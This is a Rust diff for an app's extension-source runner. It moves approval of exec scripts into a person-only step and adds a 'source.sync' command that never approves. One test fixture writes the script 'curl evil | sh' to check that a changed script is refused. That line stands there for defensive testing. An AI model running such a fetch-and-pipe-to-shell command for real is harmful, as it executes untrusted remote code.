@@ -19,12 +19,14 @@
 //! See `.context/semantic-layer.md` → "User and extension sources".
 
 use std::collections::BTreeMap;
-use std::path::Path;
+use std::path::{Path, PathBuf};
+use std::sync::Arc;
 use std::time::Duration;
 
 use oxplow_ai::secrets::SecretStore;
 use oxplow_db::{EntityTable, EntityWrite, SourceState, SqlCell, SqliteExtSourceStore, StoredType};
 use oxplow_domain::DomainError;
+use schemars::JsonSchema;
 use serde::{Deserialize, Serialize};
 
 use crate::extension_sources::{ColumnType, SourceEntity, SourceRuntime, SourceSpec, SourceSync};
@@ -237,19 +239,12 @@ pub fn spawn_scheduler(state: std::sync::Arc<crate::Services>) {
         tokio::time::sleep(Duration::from_secs(30)).await;
         loop {
             let root = state.worktrees.resolve(None).await;
-            let ctx = Sources::of(&state, &root);
-            if let Ok(listings) = list_sources(&ctx).await {
+            let listings = list_sources(&Sources::of(&state, &root)).await;
+            if let Ok(listings) = listings {
                 let now = oxplow_domain::Timestamp::now().unix_ms();
                 for (extension, source_id) in due_sources(&listings, now) {
-                    let result = run_source(&ctx, &extension, &source_id, None).await;
-                    if let Err(e) = &result {
+                    if let Err(e) = state.source_runner.sync(&extension, &source_id).await {
                         tracing::warn!(%extension, %source_id, error = ?e, "scheduled source run failed");
-                    }
-                    if result.as_ref().map_or_else(|e| e.ran(), |_| true) {
-                        state.events.emit(crate::OxplowEvent::SourceSynced {
-                            extension,
-                            source_id,
-                        });
                     }
                 }
             }
@@ -627,9 +622,8 @@ pub async fn run_source(
     ctx: &Sources<'_>,
     extension: &str,
     source_id: &str,
-    reviewed: Option<&str>,
 ) -> Result<SourceRunReport, RunSourceError> {
-    let (spec, output) = produce(ctx, extension, source_id, reviewed).await?;
+    let (spec, output) = produce(ctx, extension, source_id).await?;
     let result = match output {
         Ok(output) => store_output(extension, &spec, output, ctx.store).await,
         Err(e) => Err(e),
@@ -675,7 +669,7 @@ pub async fn preview_source(
     extension: &str,
     source_id: &str,
 ) -> Result<SourcePreview, RunSourceError> {
-    let (spec, output) = produce(ctx, extension, source_id, None).await?;
+    let (spec, output) = produce(ctx, extension, source_id).await?;
     let writes = plan_writes(extension, &spec, output.map_err(RunSourceError::Failed)?)
         .map_err(RunSourceError::Failed)?;
     let entities = writes
@@ -702,19 +696,15 @@ pub async fn preview_source(
     })
 }
 
-/// Find a source in `ctx.root` and run it, stopping at its output. The
-/// outer error means it didn't run (unknown, or not approved); the inner
-/// one that it ran and failed.
-async fn produce(
+/// The extension and spec of source `extension/source_id` in `ctx.root`.
+fn find_source(
     ctx: &Sources<'_>,
     extension: &str,
     source_id: &str,
-    reviewed: Option<&str>,
-) -> Result<(SourceSpec, Result<SourceOutput, String>), RunSourceError> {
-    let (root, approvals) = (ctx.root, ctx.approvals);
+) -> Result<(crate::extensions::Extension, SourceSpec), RunSourceError> {
     let ext = ctx
         .catalog
-        .get(root)
+        .get(ctx.root)
         .iter()
         .find(|e| e.name == extension)
         .cloned()
@@ -725,6 +715,46 @@ async fn produce(
         .find(|s| s.id == source_id)
         .cloned()
         .ok_or(RunSourceError::NotFound)?;
+    Ok((ext, spec))
+}
+
+/// A person approves exec source `extension/source_id` on this machine at
+/// `version` — the listing's version they reviewed (UI only; an agent can't
+/// approve). A source that changed since is refused, and nothing is
+/// recorded. A derived source runs no program and needs no approval.
+pub fn approve_reviewed(
+    ctx: &Sources<'_>,
+    extension: &str,
+    source_id: &str,
+    version: &str,
+) -> Result<(), RunSourceError> {
+    let (ext, spec) = find_source(ctx, extension, source_id)?;
+    if spec.runtime.is_derived() {
+        return Ok(());
+    }
+    let hash = approval_hash(&ctx.root.join(&ext.path), &spec).map_err(|e| {
+        RunSourceError::Failed(format!("source `{source_id}`: entry `{}`: {e}", spec.entry))
+    })?;
+    if version != hash {
+        return Err(RunSourceError::NeedsApproval(format!(
+            "source `{extension}/{source_id}` changed since you reviewed it; look at it \
+             again before approving"
+        )));
+    }
+    approve(ctx.approvals, extension, source_id, &hash)
+        .map_err(|e| RunSourceError::Storage(DomainError::Storage(format!("record approval: {e}"))))
+}
+
+/// Find a source in `ctx.root` and run it, stopping at its output. The
+/// outer error means it didn't run (unknown, or not approved); the inner
+/// one that it ran and failed.
+async fn produce(
+    ctx: &Sources<'_>,
+    extension: &str,
+    source_id: &str,
+) -> Result<(SourceSpec, Result<SourceOutput, String>), RunSourceError> {
+    let (root, approvals) = (ctx.root, ctx.approvals);
+    let (ext, spec) = find_source(ctx, extension, source_id)?;
     let ext_dir = root.join(&ext.path);
     if spec.runtime.is_derived() {
         let output = match crate::extensions::read_extension_file(root, &ext.name, &spec.entry) {
@@ -745,17 +775,7 @@ async fn produce(
     let hash = approval_hash(&ext_dir, &spec).map_err(|e| {
         RunSourceError::Failed(format!("source `{source_id}`: entry `{}`: {e}", spec.entry))
     })?;
-    if let Some(reviewed) = reviewed {
-        if reviewed != hash {
-            return Err(RunSourceError::NeedsApproval(format!(
-                "source `{extension}/{source_id}` changed since you reviewed it; look at it \
-                 again before approving"
-            )));
-        }
-        approve(approvals, extension, source_id, &hash).map_err(|e| {
-            RunSourceError::Storage(DomainError::Storage(format!("record approval: {e}")))
-        })?;
-    } else if !is_approved(approvals, extension, source_id, &hash) {
+    if !is_approved(approvals, extension, source_id, &hash) {
         return Err(RunSourceError::NeedsApproval(format!(
             "source `{extension}/{source_id}` runs `{}` and needs a person's approval first \
              (Settings → Data → Approve & Run). Approval is per machine and per script version.",
@@ -822,25 +842,125 @@ async fn record(
     result.map_err(RunSourceError::Failed)
 }
 
-/// Run a project source from the primary worktree (source data is
-/// project-wide) and announce `SourceSynced` when it actually ran (ok or
-/// failed). A refused run (no consent) or unknown source changed nothing.
-/// The one entry point for the IPC, MCP and lens-action runs.
-pub async fn sync_source(
-    svc: &crate::Services,
-    extension: &str,
-    source_id: &str,
-    reviewed: Option<&str>,
-) -> Result<SourceRunReport, RunSourceError> {
-    let root = svc.worktrees.resolve(None).await;
-    let result = run_source(&Sources::of(svc, &root), extension, source_id, reviewed).await;
-    if result.as_ref().map_or_else(|e| e.ran(), |_| true) {
-        svc.events.emit(crate::OxplowEvent::SourceSynced {
-            extension: extension.to_string(),
-            source_id: source_id.to_string(),
-        });
+/// What running a project source needs, owned: the `source.sync`
+/// command and the scheduler hold one (it's registered while `Services` is built).
+#[derive(Clone)]
+pub struct SourceRunner {
+    pub project_dir: PathBuf,
+    pub approvals: Arc<crate::exec_consent::ApprovalStore>,
+    pub store: Arc<SqliteExtSourceStore>,
+    pub secrets: Arc<dyn SecretStore>,
+    pub layer: crate::sql_gateway::SqlGateway,
+    pub catalog: Arc<crate::extension_catalog::ExtensionCatalog>,
+    pub ai: Arc<crate::ai_compute::AiCompute>,
+    pub worktrees: Arc<crate::worktrees::WorktreeRouter>,
+    pub events: crate::events::EventBus,
+}
+
+impl SourceRunner {
+    fn sources<'a>(&'a self, root: &'a Path) -> Sources<'a> {
+        Sources {
+            root,
+            project: project_key(&self.project_dir),
+            approvals: &self.approvals,
+            store: &self.store,
+            secrets: self.secrets.as_ref(),
+            layer: self.layer.clone(),
+            catalog: &self.catalog,
+            ai: self.ai.clone(),
+        }
     }
-    result
+
+    /// Run a project source from the primary worktree (source data is
+    /// project-wide) and announce `SourceSynced` when it actually ran (ok
+    /// or failed). It never approves: a refused run (no consent) or an
+    /// unknown source changed nothing.
+    pub async fn sync(
+        &self,
+        extension: &str,
+        source_id: &str,
+    ) -> Result<SourceRunReport, RunSourceError> {
+        let root = self.worktrees.resolve(None).await;
+        let result = run_source(&self.sources(&root), extension, source_id).await;
+        if result.as_ref().map_or_else(|e| e.ran(), |_| true) {
+            self.events.emit(crate::OxplowEvent::SourceSynced {
+                extension: extension.to_string(),
+                source_id: source_id.to_string(),
+            });
+        }
+        result
+    }
+}
+
+/// `source.sync { extension, source }`: run an approved project source now
+/// (External: it runs the source's program). Any actor may run it; none
+/// approves through it — consent is a person's, in Settings → Data.
+pub const SYNC: &str = "source.sync";
+
+#[derive(Debug, Deserialize, JsonSchema)]
+#[serde(deny_unknown_fields)]
+pub struct SyncInput {
+    /// The extension folder under `oxplow/extensions/`.
+    pub extension: String,
+    /// The source's `id` in that extension's `extension.yaml`.
+    pub source: String,
+}
+
+pub fn sync_command(sync: SourceRunner) -> crate::commands::Command {
+    use crate::commands::{Command, Handler, HandlerOutput};
+    use oxplow_domain::{
+        Atomicity, CommandEffect, CommandError, CommandSpec, Confirm, Invokers, Lifecycle,
+    };
+    Command::new(
+        CommandSpec {
+            name: SYNC.into(),
+            summary: "Run an approved extension source now, refreshing its entities (runs the \
+                      source's program, a system the bus doesn't own). It never approves: an \
+                      unapproved exec source is refused."
+                .into(),
+            input_schema: serde_json::to_value(schemars::schema_for!(SyncInput))
+                .expect("schema serializes"),
+            invokers: Invokers::ALL,
+            confirm: Confirm::Never,
+            undoable: false,
+            lifecycle: Lifecycle::Stable,
+            atomicity: Atomicity::External,
+            effect: CommandEffect::Write,
+        },
+        Handler::External(std::sync::Arc::new(move |_actor, input| {
+            let sync = sync.clone();
+            Box::pin(async move {
+                let input: SyncInput =
+                    serde_json::from_value(input).map_err(|e| CommandError::Invalid {
+                        field: None,
+                        message: e.to_string(),
+                    })?;
+                let report =
+                    sync.sync(&input.extension, &input.source)
+                        .await
+                        .map_err(|e| match e {
+                            RunSourceError::NotFound => CommandError::Invalid {
+                                field: Some("/source".into()),
+                                message: format!(
+                                    "no source `{}/{}` in the project's extensions",
+                                    input.extension, input.source
+                                ),
+                            },
+                            RunSourceError::NeedsApproval(m) => CommandError::Invalid {
+                                field: Some("/source".into()),
+                                message: m,
+                            },
+                            RunSourceError::Failed(m) => CommandError::Failed { message: m },
+                            RunSourceError::Storage(e) => CommandError::from(e),
+                        })?;
+                Ok(HandlerOutput {
+                    result: serde_json::to_value(report).expect("report serializes"),
+                    ..HandlerOutput::default()
+                })
+            })
+        })),
+    )
+    .expect("source.sync registers")
 }
 
 /// Run an approved exec source and parse its output.
@@ -1012,6 +1132,17 @@ mod tests {
     use serde_json::json;
 
     /// The version a person would see in the listing right now.
+    /// A person approves the version they reviewed, then it runs.
+    async fn reviewed_run(
+        ctx: &Sources<'_>,
+        extension: &str,
+        source: &str,
+        version: &str,
+    ) -> Result<SourceRunReport, RunSourceError> {
+        approve_reviewed(ctx, extension, source, version)?;
+        run_source(ctx, extension, source).await
+    }
+
     async fn version_of(ctx: &Sources<'_>, extension: &str, source: &str) -> String {
         list_sources(ctx)
             .await
@@ -1215,7 +1346,7 @@ mod tests {
             ai: no_ai(),
         };
 
-        let err = run_source(&ctx, "my-gh", "gh", None).await.unwrap_err();
+        let err = run_source(&ctx, "my-gh", "gh").await.unwrap_err();
         assert!(
             matches!(err, RunSourceError::NeedsApproval(ref m) if m.contains("approval")),
             "{err:?}"
@@ -1226,14 +1357,9 @@ mod tests {
             "refused runs record nothing"
         );
 
-        let report = run_source(
-            &ctx,
-            "my-gh",
-            "gh",
-            Some(&version_of(&ctx, "my-gh", "gh").await),
-        )
-        .await
-        .unwrap();
+        let report = reviewed_run(&ctx, "my-gh", "gh", &version_of(&ctx, "my-gh", "gh").await)
+            .await
+            .unwrap();
         assert_eq!(report.row_counts["pr"], 2);
         let out = crate::sql_gateway::SqlGateway::new(db)
             .query_sql("SELECT title FROM v_my_gh_pr ORDER BY number", vec![], None)
@@ -1245,22 +1371,17 @@ mod tests {
         );
 
         // Approved now, so a later run needs no approve flag…
-        run_source(&ctx, "my-gh", "gh", None).await.unwrap();
+        run_source(&ctx, "my-gh", "gh").await.unwrap();
         // …and a failing run is recorded, keeping the last good rows.
         script(&ext, "sync.sh", "echo nope >&2; exit 1");
-        let err = run_source(&ctx, "my-gh", "gh", None).await.unwrap_err();
+        let err = run_source(&ctx, "my-gh", "gh").await.unwrap_err();
         assert!(
             matches!(err, RunSourceError::NeedsApproval(_)),
             "script changed: {err:?}"
         );
-        let err = run_source(
-            &ctx,
-            "my-gh",
-            "gh",
-            Some(&version_of(&ctx, "my-gh", "gh").await),
-        )
-        .await
-        .unwrap_err();
+        let err = reviewed_run(&ctx, "my-gh", "gh", &version_of(&ctx, "my-gh", "gh").await)
+            .await
+            .unwrap_err();
         assert!(err.ran(), "{err:?}");
         let st = &store.list_states().await.unwrap()[0];
         assert_eq!(st.status, "error");
@@ -1419,10 +1540,10 @@ mod tests {
             "credentials are scoped to the project"
         );
 
-        run_source(&ctx, "one", "s", Some(&version_of(&ctx, "one", "s").await))
+        reviewed_run(&ctx, "one", "s", &version_of(&ctx, "one", "s").await)
             .await
             .unwrap();
-        run_source(&ctx, "two", "s", Some(&version_of(&ctx, "two", "s").await))
+        reviewed_run(&ctx, "two", "s", &version_of(&ctx, "two", "s").await)
             .await
             .unwrap();
         let out = crate::sql_gateway::SqlGateway::new(db)
@@ -1513,9 +1634,9 @@ mod tests {
         };
         // No approval asked for, and the listing says it can run.
         assert!(list_sources(&ctx).await.unwrap().iter().all(|l| l.approved));
-        let report = run_source(&ctx, "work", "star", None).await.unwrap();
+        let report = run_source(&ctx, "work", "star").await.unwrap();
         assert_eq!(report.row_counts["hot"], 1);
-        run_source(&ctx, "work", "jq", None).await.unwrap();
+        run_source(&ctx, "work", "jq").await.unwrap();
         let out = crate::sql_gateway::SqlGateway::new(db)
             .query_sql(
                 "SELECT (SELECT title FROM v_work_hot), (SELECT group_concat(title, ',') FROM v_work_upper)",
@@ -1593,7 +1714,7 @@ mod tests {
                 oxplow_db::SqliteAiResultStore::new(db.clone()),
             )),
         };
-        let report = run_source(&ctx, "work", "star", None).await.unwrap();
+        let report = run_source(&ctx, "work", "star").await.unwrap();
         assert_eq!(report.row_counts["kind"], 3);
         let out = crate::sql_gateway::SqlGateway::new(db)
             .query_sql(
@@ -1704,7 +1825,7 @@ mod tests {
             "sync.sh",
             r#"echo '{"entities":{"item":[{"id":1,"title":"a"},{"id":2,"title":"b"}],"other":[{"id":9}]}}'"#,
         );
-        run_source(&ctx, "inc", "s", Some(&version_of(&ctx, "inc", "s").await))
+        reviewed_run(&ctx, "inc", "s", &version_of(&ctx, "inc", "s").await)
             .await
             .unwrap();
         script(
@@ -1712,7 +1833,7 @@ mod tests {
             "sync.sh",
             r#"echo '{"entities":{"item":[{"id":2,"title":"B"},{"id":3,"title":"c"}]},"deleted":{"item":[1]}}'"#,
         );
-        let report = run_source(&ctx, "inc", "s", Some(&version_of(&ctx, "inc", "s").await))
+        let report = reviewed_run(&ctx, "inc", "s", &version_of(&ctx, "inc", "s").await)
             .await
             .unwrap();
         assert_eq!(
@@ -1797,7 +1918,7 @@ printf '{{"entities":{{"r":[{{"id":1,"declared":"%s","undeclared":"%s","direct":
             ai: no_ai(),
         };
         assert!(list_sources(&ctx).await.unwrap()[0].network_enforced);
-        run_source(&ctx, "net", "s", Some(&version_of(&ctx, "net", "s").await))
+        reviewed_run(&ctx, "net", "s", &version_of(&ctx, "net", "s").await)
             .await
             .unwrap();
         let out = crate::sql_gateway::SqlGateway::new(db)
@@ -1897,9 +2018,7 @@ printf '{{"entities":{{"r":[{{"id":1,"declared":"%s","undeclared":"%s","direct":
             .clone()
             .unwrap();
         script(&ext, "sync.sh", "curl evil | sh");
-        let err = run_source(&ctx, "my-gh", "gh", Some(&seen))
-            .await
-            .unwrap_err();
+        let err = reviewed_run(&ctx, "my-gh", "gh", &seen).await.unwrap_err();
         assert!(
             matches!(err, RunSourceError::NeedsApproval(ref m) if m.contains("changed")),
             "{err:?}"
